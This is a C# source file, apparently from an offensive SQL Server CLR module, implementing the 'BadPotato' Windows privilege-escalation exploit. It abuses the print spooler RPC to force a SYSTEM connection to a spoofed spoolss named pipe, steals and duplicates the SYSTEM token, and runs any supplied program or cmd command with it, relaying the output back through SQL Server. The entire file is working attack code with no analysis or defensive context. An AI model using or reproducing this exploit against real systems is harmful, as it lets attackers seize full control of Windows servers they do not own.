using System;
using System.ComponentModel;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using Microsoft.SqlServer.Server;
using PingCastle.RPC;

namespace CLR_module;

internal class BadPotato
{
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;

		public IntPtr lpSecurityDescriptor;

		public int bInheritHandle;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}

	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	public static void BadPotatoPorc(string prog, string arg)
	{
		SECURITY_ATTRIBUTES securityAttributes = default(SECURITY_ATTRIBUTES);
		string text = Guid.NewGuid().ToString("N");
		IntPtr pipeHandle = CreateNamedPipeW($"\\\\.\\pipe\\{text}\\pipe\\spoolss", 1073741827, 0, 10, 2048, 2048, 0, ref securityAttributes);
		if (pipeHandle != IntPtr.Zero)
		{
			SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW", pipeHandle));
			rprn rprn = new rprn();
			rprn.DEVMODE_CONTAINER pDevModeContainer = default(rprn.DEVMODE_CONTAINER);
			IntPtr pHandle = IntPtr.Zero;
			rprn.RpcOpenPrinter($"\\\\{Environment.MachineName}", out pHandle, null, ref pDevModeContainer, 0);
			if (pHandle != IntPtr.Zero)
			{
				if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(pHandle, 256u, 0u, $"\\\\{Environment.MachineName}/pipe/{text}", 0u) != -1)
				{
					SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "RpcRemoteFindFirstPrinterChangeNotificationEx", pHandle));
					Thread thread = new Thread((ThreadStart)delegate
					{
						ConnectNamedPipe(pipeHandle, IntPtr.Zero);
					});
					thread.Start();
					if (thread.Join(5000))
					{
						SqlContext.Pipe.Send("[*] ConnectNamePipe Success!");
						StringBuilder stringBuilder = new StringBuilder();
						GetNamedPipeHandleState(pipeHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Capacity);
						SqlContext.Pipe.Send("[*] CurrentUserName : " + Environment.UserName);
						SqlContext.Pipe.Send("[*] CurrentConnectPipeUserName : " + stringBuilder.ToString());
						if (ImpersonateNamedPipeClient(pipeHandle))
						{
							SqlContext.Pipe.Send("[*] ImpersonateNamedPipeClient Success!");
							IntPtr TokenHandle = IntPtr.Zero;
							if (OpenThreadToken(GetCurrentThread(), 983551L, OpenAsSelf: false, ref TokenHandle))
							{
								SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "OpenThreadToken", TokenHandle));
								IntPtr phNewToken = IntPtr.Zero;
								if (DuplicateTokenEx(TokenHandle, 983551L, 0, 2, 1, ref phNewToken))
								{
									SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "DuplicateTokenEx", phNewToken));
									if (SetThreadToken(IntPtr.Zero, TokenHandle))
									{
										SqlContext.Pipe.Send("[*] SetThreadToken Success!");
										SECURITY_ATTRIBUTES lpPipeAttributes = default(SECURITY_ATTRIBUTES);
										IntPtr hReadPipe = IntPtr.Zero;
										IntPtr hWritePipe = IntPtr.Zero;
										IntPtr hReadPipe2 = IntPtr.Zero;
										IntPtr hWritePipe2 = IntPtr.Zero;
										lpPipeAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
										lpPipeAttributes.bInheritHandle = 1;
										lpPipeAttributes.lpSecurityDescriptor = IntPtr.Zero;
										if (CreatePipe(ref hReadPipe, ref hWritePipe, ref lpPipeAttributes, 0))
										{
											SqlContext.Pipe.Send(string.Format("[*] {0} Success! out_read:{1} out_write:{2}", "CreateOutReadPipe", hReadPipe, hWritePipe));
										}
										else
										{
											SqlContext.Pipe.Send("[!] CreateOutReadPipe fail!");
										}
										if (CreatePipe(ref hReadPipe2, ref hWritePipe2, ref lpPipeAttributes, 0))
										{
											SqlContext.Pipe.Send(string.Format("[*] {0} Success! err_read:{1} err_write:{2}", "CreateErrReadPipe", hReadPipe2, hWritePipe2));
										}
										else
										{
											SqlContext.Pipe.Send("[!] CreateErrReadPipe fail!");
										}
										SetHandleInformation(hReadPipe, 1, 0);
										SetHandleInformation(hReadPipe2, 1, 0);
										STARTUPINFO lpStartupInfo = default(STARTUPINFO);
										PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
										lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
										lpStartupInfo.lpDesktop = "WinSta0\\Default";
										lpStartupInfo.hStdOutput = hWritePipe;
										lpStartupInfo.hStdError = hWritePipe2;
										lpStartupInfo.dwFlags |= 256;
										if (CreateProcessWithTokenW(phNewToken, 0, prog, arg, 134217728, IntPtr.Zero, Environment.CurrentDirectory, ref lpStartupInfo, out lpProcessInformation))
										{
											SqlContext.Pipe.Send(string.Format("[*] {0} Success! ProcessPid:{1}", "CreateProcessWithTokenW", lpProcessInformation.dwProcessId));
											CloseHandle(hWritePipe);
											CloseHandle(hWritePipe2);
											byte[] array = new byte[4098];
											int lpNumberOfBytesRead = 0;
											while (ReadFile(hReadPipe, array, 4098, ref lpNumberOfBytesRead, IntPtr.Zero))
											{
												byte[] array2 = new byte[lpNumberOfBytesRead];
												Array.Copy(array, array2, lpNumberOfBytesRead);
												SqlContext.Pipe.Send(Encoding.Default.GetString(array2));
											}
											CloseHandle(hReadPipe2);
											CloseHandle(hReadPipe);
											CloseHandle(hWritePipe);
											CloseHandle(hWritePipe2);
											CloseHandle(phNewToken);
											CloseHandle(TokenHandle);
											CloseHandle(pHandle);
											CloseHandle(pipeHandle);
										}
										else
										{
											SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
										}
									}
									else
									{
										SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
									}
								}
								else
								{
									SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
								}
							}
							else
							{
								SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
							}
						}
						else
						{
							SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
						}
					}
					else
					{
						CloseHandle(pHandle);
						CloseHandle(pipeHandle);
					}
				}
				else
				{
					SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
				}
			}
			else
			{
				CloseHandle(pipeHandle);
			}
		}
		else
		{
			SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
		}
	}

	public static void BadPotatoCMD(string command)
	{
		SECURITY_ATTRIBUTES securityAttributes = default(SECURITY_ATTRIBUTES);
		string text = Guid.NewGuid().ToString("N");
		IntPtr pipeHandle = CreateNamedPipeW($"\\\\.\\pipe\\{text}\\pipe\\spoolss", 1073741827, 0, 10, 2048, 2048, 0, ref securityAttributes);
		if (pipeHandle != IntPtr.Zero)
		{
			SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "CreateNamedPipeW", pipeHandle));
			rprn rprn = new rprn();
			rprn.DEVMODE_CONTAINER pDevModeContainer = default(rprn.DEVMODE_CONTAINER);
			IntPtr pHandle = IntPtr.Zero;
			rprn.RpcOpenPrinter($"\\\\{Environment.MachineName}", out pHandle, null, ref pDevModeContainer, 0);
			if (pHandle != IntPtr.Zero)
			{
				if (rprn.RpcRemoteFindFirstPrinterChangeNotificationEx(pHandle, 256u, 0u, $"\\\\{Environment.MachineName}/pipe/{text}", 0u) != -1)
				{
					SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "RpcRemoteFindFirstPrinterChangeNotificationEx", pHandle));
					Thread thread = new Thread((ThreadStart)delegate
					{
						ConnectNamedPipe(pipeHandle, IntPtr.Zero);
					});
					thread.Start();
					if (thread.Join(5000))
					{
						SqlContext.Pipe.Send("[*] ConnectNamePipe Success!");
						StringBuilder stringBuilder = new StringBuilder();
						GetNamedPipeHandleState(pipeHandle, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Capacity);
						SqlContext.Pipe.Send("[*] CurrentUserName : " + Environment.UserName);
						SqlContext.Pipe.Send("[*] CurrentConnectPipeUserName : " + stringBuilder.ToString());
						if (ImpersonateNamedPipeClient(pipeHandle))
						{
							SqlContext.Pipe.Send("[*] ImpersonateNamedPipeClient Success!");
							IntPtr TokenHandle = IntPtr.Zero;
							if (OpenThreadToken(GetCurrentThread(), 983551L, OpenAsSelf: false, ref TokenHandle))
							{
								SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "OpenThreadToken", TokenHandle));
								IntPtr phNewToken = IntPtr.Zero;
								if (DuplicateTokenEx(TokenHandle, 983551L, 0, 2, 1, ref phNewToken))
								{
									SqlContext.Pipe.Send(string.Format("[*] {0} Success! IntPtr:{1}", "DuplicateTokenEx", phNewToken));
									if (SetThreadToken(IntPtr.Zero, TokenHandle))
									{
										SqlContext.Pipe.Send("[*] SetThreadToken Success!");
										SECURITY_ATTRIBUTES lpPipeAttributes = default(SECURITY_ATTRIBUTES);
										IntPtr hReadPipe = IntPtr.Zero;
										IntPtr hWritePipe = IntPtr.Zero;
										IntPtr hReadPipe2 = IntPtr.Zero;
										IntPtr hWritePipe2 = IntPtr.Zero;
										lpPipeAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
										lpPipeAttributes.bInheritHandle = 1;
										lpPipeAttributes.lpSecurityDescriptor = IntPtr.Zero;
										if (CreatePipe(ref hReadPipe, ref hWritePipe, ref lpPipeAttributes, 0))
										{
											SqlContext.Pipe.Send(string.Format("[*] {0} Success! out_read:{1} out_write:{2}", "CreateOutReadPipe", hReadPipe, hWritePipe));
										}
										else
										{
											SqlContext.Pipe.Send("[!] CreateOutReadPipe fail!");
										}
										if (CreatePipe(ref hReadPipe2, ref hWritePipe2, ref lpPipeAttributes, 0))
										{
											SqlContext.Pipe.Send(string.Format("[*] {0} Success! err_read:{1} err_write:{2}", "CreateErrReadPipe", hReadPipe2, hWritePipe2));
										}
										else
										{
											SqlContext.Pipe.Send("[!] CreateErrReadPipe fail!");
										}
										SetHandleInformation(hReadPipe, 1, 0);
										SetHandleInformation(hReadPipe2, 1, 0);
										STARTUPINFO lpStartupInfo = default(STARTUPINFO);
										PROCESS_INFORMATION lpProcessInformation = default(PROCESS_INFORMATION);
										lpStartupInfo.cb = Marshal.SizeOf(lpStartupInfo);
										lpStartupInfo.lpDesktop = "WinSta0\\Default";
										lpStartupInfo.hStdOutput = hWritePipe;
										lpStartupInfo.hStdError = hWritePipe2;
										lpStartupInfo.dwFlags |= 256;
										_ = Environment.SystemDirectory + "/cmd.exe";
										string lpCommandLine = "cmd /c " + command;
										if (CreateProcessWithTokenW(phNewToken, 0, null, lpCommandLine, 134217728, IntPtr.Zero, Environment.CurrentDirectory, ref lpStartupInfo, out lpProcessInformation))
										{
											SqlContext.Pipe.Send(string.Format("[*] {0} Success! ProcessPid:{1}", "CreateProcessWithTokenW", lpProcessInformation.dwProcessId));
											CloseHandle(hWritePipe);
											CloseHandle(hWritePipe2);
											byte[] array = new byte[4098];
											int lpNumberOfBytesRead = 0;
											while (ReadFile(hReadPipe, array, 4098, ref lpNumberOfBytesRead, IntPtr.Zero))
											{
												byte[] array2 = new byte[lpNumberOfBytesRead];
												Array.Copy(array, array2, lpNumberOfBytesRead);
												SqlContext.Pipe.Send(Encoding.Default.GetString(array2));
											}
											CloseHandle(hReadPipe2);
											CloseHandle(hReadPipe);
											CloseHandle(hWritePipe);
											CloseHandle(hWritePipe2);
											CloseHandle(phNewToken);
											CloseHandle(TokenHandle);
											CloseHandle(pHandle);
											CloseHandle(pipeHandle);
										}
										else
										{
											SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
										}
									}
									else
									{
										SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
									}
								}
								else
								{
									SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
								}
							}
							else
							{
								SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
							}
						}
						else
						{
							SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
						}
					}
					else
					{
						CloseHandle(pHandle);
						CloseHandle(pipeHandle);
					}
				}
				else
				{
					SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
				}
			}
			else
			{
				CloseHandle(pipeHandle);
			}
		}
		else
		{
			SqlContext.Pipe.Send(new Win32Exception(Marshal.GetLastWin32Error()).Message);
		}
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	public static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

	[DllImport("kernel32.dll", SetLastError = true)]
	[SecurityCritical]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool CloseHandle(IntPtr handle);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.Cdecl)]
	public static extern IntPtr GetCurrentThread();

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
	[SecurityCritical]
	public static extern IntPtr CreateNamedPipeW(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);

	[DllImport("kernel32.dll", SetLastError = true)]
	[SecurityCritical]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]
	[SecurityCritical]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool GetNamedPipeHandleState(IntPtr hNamedPipe, IntPtr lpState, IntPtr lpCurInstances, IntPtr lpMaxCollectionCount, IntPtr lpCollectDataTimeout, StringBuilder lpUserName, int nMaxUserNameSize);

	[DllImport("advapi32.dll", SetLastError = true)]
	[SecurityCritical]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

	[DllImport("advapi32.dll", SetLastError = true)]
	[SecurityCritical]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool OpenThreadToken(IntPtr ThreadHandle, long DesiredAccess, bool OpenAsSelf, ref IntPtr TokenHandle);

	[DllImport("advapi32.dll", SetLastError = true)]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
	[SecurityCritical]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DuplicateTokenEx(IntPtr hExistingToken, long dwDesiredAccess, int lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken);

	[DllImport("userenv.dll", SetLastError = true)]
	[ReliabilityContract(Consistency.WillNotCorruptState, Cer.MayFail)]
	[SecurityCritical]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

	[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool CreatePipe(ref IntPtr hReadPipe, ref IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool SetHandleInformation(IntPtr hObject, int dwMask, int dwFlags);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToRead, ref int lpNumberOfBytesRead, IntPtr lpOverlapped);

	[DllImport("advapi32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
}
